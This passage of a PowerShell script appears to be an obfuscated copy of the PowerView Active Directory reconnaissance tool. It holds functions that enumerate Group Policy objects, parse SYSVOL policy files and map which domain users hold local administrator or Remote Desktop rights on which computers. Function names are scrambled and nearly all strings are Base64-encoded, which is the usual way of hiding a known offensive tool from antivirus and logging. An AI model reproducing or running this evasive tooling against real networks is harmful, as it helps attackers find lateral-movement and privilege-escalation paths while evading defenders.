                                ${____/\/=\__/=\_/=} = ${_/\/=\_/\__/\/=\/}.SubString(${_/\/=\_/\__/\/=\/}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                                ${_/==\/=\_/\____/=} = "\\${____/\/=\__/=\_/=}\SysVol\${____/\/=\__/=\_/=}\Policies\$(${__/\_/\/==\/\__/=}.cn)"
                                ${__/\_/\/==\/\__/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwBwAGMAZgBpAGwAZQBzAHkAcwBwAGEAdABoAA=='))) ${_/==\/=\_/\____/=}
                            }
                            catch {
                                Write-Verbose "[Get-DomainGPO] Error calculating gpcfilesyspath for: $(${__/\_/\/==\/\__/=}.distinguishedname)"
                            }
                        }
                        else {
                            ${__/\_/\/==\/\__/=} = _______/==\_/=\_/= -Properties $_.Properties
                        }
                        ${__/\_/\/==\/\__/=}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwA='))))
                    }
                    ${__/\_/\/==\/\__/=}
                }
                if (${_/\__/\/=====\_/\}) {
                    try { ${_/\__/\/=====\_/\}.dispose() }
                    catch {
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAF0AIABFAHIAcgBvAHIAIABkAGkAcwBwAG8AcwBpAG4AZwAgAG8AZgAgAHQAaABlACAAUgBlAHMAdQBsAHQAcwAgAG8AYgBqAGUAYwB0ADoAIAAkAF8A')))
                    }
                }
                ${__/\/==\/\__/===\}.dispose()
            }
        }
    }
}
function __/\/=\/\/=\/===== {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GPOGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $Identity,
        [Switch]
        ${__/====\__/=\/==\/},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${_/\/\/\/\___/\/\/} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${/=======\/==\_/==} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${/=======\/==\_/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/=======\/==\_/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/=======\/==\_/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${_/=\/=\/=\/\/\/==} = [System.StringSplitOptions]::RemoveEmptyEntries
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Identity }
        ____/===\__/=\__/= @_/\/\/\/\___/\/\/ | % {
            ${/=\/=\_/==\/=\___} = $_.displayname
            $GPOname = $_.name
            ${/=\/===\___/\__/\} = $_.gpcfilesyspath
            ${_/=\/\/\__/=\/\/\} =  @{ 'GptTmplPath' = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQBcAC8APQA9AD0AXABfAF8AXwAvAFwAXwBfAC8AXAB9AFwATQBBAEMASABJAE4ARQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAE4AVABcAFMAZQBjAEUAZABpAHQAXABHAHAAdABUAG0AcABsAC4AaQBuAGYA'))) }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/=\/\/\__/=\/\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            ${/=\_/\/\/\_/=====} = ____/==\/\/\/\__/= @_/=\/\/\__/=\/\/\
            if (${/=\_/\/\/\_/=====} -and (${/=\_/\/\/\_/=====}.psbase.Keys -contains $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwACAATQBlAG0AYgBlAHIAcwBoAGkAcAA='))))) {
                ${/==\_/\__/=\_/\/\} = @{}
                ForEach (${/=\/\/===\/\/==\/} in ${/=\_/\/\/\_/=====}.'Group Membership'.GetEnumerator()) {
                    ${_/==\/=\/=\/\/\/\}, $Relation = ${/=\/\/===\/\/==\/}.Key.Split('__', ${_/=\/=\/=\/\/\/==}) | % {$_.Trim()}
                    ${/=\/====\/==\_/\/} = ${/=\/\/===\/\/==\/}.Value | ? {$_} | % { $_.Trim('*') } | ? {$_}
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAbwBsAHYAZQBNAGUAbQBiAGUAcgBzAFQAbwBTAEkARABzAA==')))]) {
                        ${/====\/=\___/=\/\} = @()
                        ForEach (${_/==\__/=\____/\/} in ${/=\/====\/==\_/\/}) {
                            if (${_/==\__/=\____/\/} -and (${_/==\__/=\____/\/}.Trim() -ne '')) {
                                if (${_/==\__/=\____/\/} -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtAC4AKgA=')))) {
                                    ${/==\/\_/===\____/} = @{'ObjectName' = ${_/==\__/=\____/\/}}
                                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${/==\/\_/===\____/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
                                    ${_/\___/\__/=\/==\} = ___/\___/\/===\_/= @/==\/\_/===\____/
                                    if (${_/\___/\__/=\/==\}) {
                                        ${/====\/=\___/=\/\} += ${_/\___/\__/=\/==\}
                                    }
                                    else {
                                        ${/====\/=\___/=\/\} += ${_/==\__/=\____/\/}
                                    }
                                }
                                else {
                                    ${/====\/=\___/=\/\} += ${_/==\__/=\____/\/}
                                }
                            }
                        }
                        ${/=\/====\/==\_/\/} = ${/====\/=\___/=\/\}
                    }
                    if (-not ${/==\_/\__/=\_/\/\}[${_/==\/=\/=\/\/\/\}]) {
                        ${/==\_/\__/=\_/\/\}[${_/==\/=\/=\/\/\/\}] = @{}
                    }
                    if (${/=\/====\/==\_/\/} -isnot [System.Array]) {${/=\/====\/==\_/\/} = @(${/=\/====\/==\_/\/})}
                    ${/==\_/\__/=\_/\/\}[${_/==\/=\/=\/\/\/\}].Add($Relation, ${/=\/====\/==\_/\/})
                }
                ForEach (${/=\/\/===\/\/==\/} in ${/==\_/\__/=\_/\/\}.GetEnumerator()) {
                    if (${/=\/\/===\/\/==\/} -and ${/=\/\/===\/\/==\/}.Key -and (${/=\/\/===\/\/==\/}.Key -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBcACoA'))))) {
                        ${_/==\_/=\_/======} = ${/=\/\/===\/\/==\/}.Key.Trim('*')
                        if (${_/==\_/=\_/======} -and (${_/==\_/=\_/======}.Trim() -ne '')) {
                            ${_/\/\_/===\_/=\/\} = __/\/=\/=\_/\/=\/= -/===\_/\_/\_/=\__ ${_/==\_/=\_/======} @/=======\/==\_/==
                        }
                        else {
                            ${_/\/\_/===\_/=\/\} = $False
                        }
                    }
                    else {
                        ${_/\/\_/===\_/=\/\} = ${/=\/\/===\/\/==\/}.Key
                        if (${_/\/\_/===\_/=\/\} -and (${_/\/\_/===\_/=\/\}.Trim() -ne '')) {
                            if (${_/\/\_/===\_/=\/\} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgBzAA==')))) {
                                ${_/==\_/=\_/======} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADQA')))
                            }
                            elseif (${_/\/\_/===\_/=\/\} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAIABEAGUAcwBrAHQAbwBwAA==')))) {
                                ${_/==\_/=\_/======} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADUA')))
                            }
                            elseif (${_/\/\_/===\_/=\/\} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwB1AGUAcwB0AHMA')))) {
                                ${_/==\_/=\_/======} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADYA')))
                            }
                            elseif (${_/\/\_/===\_/=\/\}.Trim() -ne '') {
                                ${/==\/\_/===\____/} = @{'ObjectName' = ${_/\/\_/===\_/=\/\}}
                                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${/==\/\_/===\____/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
                                ${_/==\_/=\_/======} = ___/\___/\/===\_/= @/==\/\_/===\____/
                            }
                            else {
                                ${_/==\_/=\_/======} = $Null
                            }
                        }
                    }
                    ${_/\___/\_/\_/====} = New-Object PSObject
                    ${_/\___/\_/\_/====} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) ${/=\/=\_/==\/=\___}
                    ${_/\___/\_/\_/====} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ATgBhAG0AZQA='))) $GPOName
                    ${_/\___/\_/\_/====} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AUABhAHQAaAA='))) ${/=\/===\___/\__/\}
                    ${_/\___/\_/\_/====} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdAByAGkAYwB0AGUAZABHAHIAbwB1AHAAcwA=')))
                    ${_/\___/\_/\_/====} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAdABlAHIAcwA='))) $Null
                    ${_/\___/\_/\_/====} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) ${_/\/\_/===\_/=\/\}
                    ${_/\___/\_/\_/====} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAFMASQBEAA=='))) ${_/==\_/=\_/======}
                    ${_/\___/\_/\_/====} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE0AZQBtAGIAZQByAE8AZgA='))) ${/=\/\/===\/\/==\/}.Value.Memberof
                    ${_/\___/\_/\_/====} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE0AZQBtAGIAZQByAHMA'))) ${/=\/\/===\/\/==\/}.Value.Members
                    ${_/\___/\_/\_/====}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwBHAHIAbwB1AHAA'))))
                    ${_/\___/\_/\_/====}
                }
            }
            ${_/=\/\/\__/=\/\/\} =  @{
                'GroupsXMLpath' = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQBcAC8APQA9AD0AXABfAF8AXwAvAFwAXwBfAC8AXAB9AFwATQBBAEMASABJAE4ARQBcAFAAcgBlAGYAZQByAGUAbgBjAGUAcwBcAEcAcgBvAHUAcABzAFwARwByAG8AdQBwAHMALgB4AG0AbAA=')))
            }
            __/=====\_/\/=\_/\ @_/=\/\/\__/=\/\/\ | % {
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAbwBsAHYAZQBNAGUAbQBiAGUAcgBzAFQAbwBTAEkARABzAA==')))]) {
                    ${/====\/=\___/=\/\} = @()
                    ForEach (${_/==\__/=\____/\/} in $_.GroupMembers) {
                        if (${_/==\__/=\____/\/} -and (${_/==\__/=\____/\/}.Trim() -ne '')) {
                            if (${_/==\__/=\____/\/} -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtAC4AKgA=')))) {
                                ${/==\/\_/===\____/} = @{'ObjectName' = ${_/\/\_/===\_/=\/\}}
                                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${/==\/\_/===\____/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
                                ${_/\___/\__/=\/==\} = ___/\___/\/===\_/= -Domain $Domain -_/\/\_/\____/\/== ${_/==\__/=\____/\/}
                                if (${_/\___/\__/=\/==\}) {
                                    ${/====\/=\___/=\/\} += ${_/\___/\__/=\/==\}
                                }
                                else {
                                    ${/====\/=\___/=\/\} += ${_/==\__/=\____/\/}
                                }
                            }
                            else {
                                ${/====\/=\___/=\/\} += ${_/==\__/=\____/\/}
                            }
                        }
                    }
                    $_.GroupMembers = ${/====\/=\___/=\/\}
                }
                $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) ${/=\/=\_/==\/=\___}
                $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ATgBhAG0AZQA='))) $GPOName
                $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAFAAbwBsAGkAYwB5AFAAcgBlAGYAZQByAGUAbgBjAGUAcwA=')))
                $_.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwBHAHIAbwB1AHAA'))))
                $_
            }
        }
    }
}
function Get-DomainGPOUserLocalGroupMapping {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GPOUserLocalGroupMapping')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $Identity,
        [String]
        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
        $LocalGroup = 'Administrators',
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${____/\/\_/\/\/=\/} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${____/\/\_/\/\/=\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${____/\/\_/\/\/=\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${____/\/\_/\/\/=\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${____/\/\_/\/\/=\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${____/\/\_/\/\/=\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${____/\/\_/\/\/=\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${____/\/\_/\/\/=\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        ${/==\/==\_/==\/=\/} = @()
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))]) {
            ${/==\/==\_/==\/=\/} += _____/\/==\/\_/=== @____/\/\_/\/\/=\/ -Identity $Identity | select -Expand objectsid
            ${/\_______/==\/===} = ${/==\/==\_/==\/=\/}
            if (-not ${/==\/==\_/==\/=\/}) {
                Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAFUAcwBlAHIATABvAGMAYQBsAEcAcgBvAHUAcABNAGEAcABwAGkAbgBnAF0AIABVAG4AYQBiAGwAZQAgAHQAbwAgAHIAZQB0AHIAaQBlAHYAZQAgAFMASQBEACAAZgBvAHIAIABpAGQAZQBuAHQAaQB0AHkAIAAnACQASQBkAGUAbgB0AGkAdAB5ACcA')))
            }
        }
        else {
            ${/==\/==\_/==\/=\/} = @('*')
        }
        if ($LocalGroup -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AA==')))) {
            ${___/=\____/\__/\_} = $LocalGroup
        }
        elseif ($LocalGroup -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAA==')))) {
            ${___/=\____/\__/\_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADQA')))
        }
        else {
            ${___/=\____/\__/\_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADUA')))
        }
        if (${/==\/==\_/==\/=\/}[0] -ne '*') {
            ForEach (${_/\__/====\/\__/\} in ${/==\/==\_/==\/=\/}) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAFUAcwBlAHIATABvAGMAYQBsAEcAcgBvAHUAcABNAGEAcABwAGkAbgBnAF0AIABFAG4AdQBtAGUAcgBhAHQAaQBuAGcAIABuAGUAcwB0AGUAZAAgAGcAcgBvAHUAcAAgAG0AZQBtAGIAZQByAHMAaABpAHAAcwAgAGYAbwByADoAIAAnACQAewBfAC8AXABfAF8ALwA9AD0APQA9AFwALwBcAF8AXwAvAFwAfQAnAA==')))
                ${/==\/==\_/==\/=\/} += __/\_/\/\__/==\/\_ @____/\/\_/\/\/=\/ -Properties $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAcwBpAGQA'))) -___/\_/\/=\/\/\/\_ ${_/\__/====\/\__/\} | select -ExpandProperty objectsid
            }
        }
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAFUAcwBlAHIATABvAGMAYQBsAEcAcgBvAHUAcABNAGEAcABwAGkAbgBnAF0AIABUAGEAcgBnAGUAdAAgAGwAbwBjAGEAbABnAHIAbwB1AHAAIABTAEkARAA6ACAAJAB7AF8AXwBfAC8APQBcAF8AXwBfAF8ALwBcAF8AXwAvAFwAXwB9AA==')))
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAFUAcwBlAHIATABvAGMAYQBsAEcAcgBvAHUAcABNAGEAcABwAGkAbgBnAF0AIABFAGYAZgBlAGMAdABpAHYAZQAgAHQAYQByAGcAZQB0ACAAZABvAG0AYQBpAG4AIABTAEkARABzADoAIAAkAHsALwA9AD0AXAAvAD0APQBcAF8ALwA9AD0AXAAvAD0AXAAvAH0A')))
        ${_/\/\/==\__/=\_/\} = __/\/=\/\/=\/===== @____/\/\_/\/\/=\/ -__/====\__/=\/==\/ | % {
            ${_/\___/\_/\_/====} = $_
            if (${_/\___/\_/\_/====}.GroupSID -match ${___/=\____/\__/\_}) {
                ${_/\___/\_/\_/====}.GroupMembers | ? {$_} | % {
                    if ( (${/==\/==\_/==\/=\/}[0] -eq '*') -or (${/==\/==\_/==\/=\/} -Contains $_) ) {
                        ${_/\___/\_/\_/====}
                    }
                }
            }
            if ( (${_/\___/\_/\_/====}.GroupMemberOf -contains ${___/=\____/\__/\_}) ) {
                if ( (${/==\/==\_/==\/=\/}[0] -eq '*') -or (${/==\/==\_/==\/=\/} -Contains ${_/\___/\_/\_/====}.GroupSID) ) {
                    ${_/\___/\_/\_/====}
                }
            }
        } | sort -Property GPOName -Unique
        ${_/\/\/==\__/=\_/\} | ? {$_} | % {
            $GPOname = $_.GPODisplayName
            ${_/=\/\_/\/\__/==\} = $_.GPOName
            ${/=\/===\___/\__/\} = $_.GPOPath
            ${_/\/=\/===\/\_/=\} = $_.GPOType
            if ($_.GroupMembers) {
                ${/=\/\/=\_/\/=\/\_} = $_.GroupMembers
            }
            else {
                ${/=\/\/=\_/\/=\/\_} = $_.GroupSID
            }
            ${/===\____/\/\/\/\} = $_.Filters
            if (${/==\/==\_/==\/=\/}[0] -eq '*') {
                ${__/\_/\__/=\__/=\} = ${/=\/\/=\_/\/=\/\_}
            }
            else {
                ${__/\_/\__/=\__/=\} = ${/\_______/==\/===}
            }
            _/====\/\/\/\/\/=\ @____/\/\_/\/\/=\/ -Raw -Properties $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQAsAGQAaQBzAHQAaQBuAGcAdQBpAHMAaABlAGQAbgBhAG0AZQA='))) -_/=\/==\/==\_/=\/\ ${_/=\/\_/\/\__/==\} | % {
                if (${/===\____/\/\/\/\}) {
                    ${/===\/\/\_/=\__/=} = __/\/\/=\/\_/==\/\ @____/\/\_/\/\/=\/ -Properties $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlACwAZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))) -SearchBase $_.Path | ? {$_.distinguishedname -match (${/===\____/\/\/\/\}.Value)} | select -ExpandProperty dnshostname
                }
                else {
                    ${/===\/\/\_/=\__/=} = __/\/\/=\/\_/==\/\ @____/\/\_/\/\/=\/ -Properties $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlAA=='))) -SearchBase $_.Path | select -ExpandProperty dnshostname
                }
                if (${/===\/\/\_/=\__/=}) {
                    if (${/===\/\/\_/=\__/=} -isnot [System.Array]) {${/===\/\/\_/=\__/=} = @(${/===\/\/\_/=\__/=})}
                    ForEach (${_/\__/====\/\__/\} in ${__/\_/\__/=\__/=\}) {
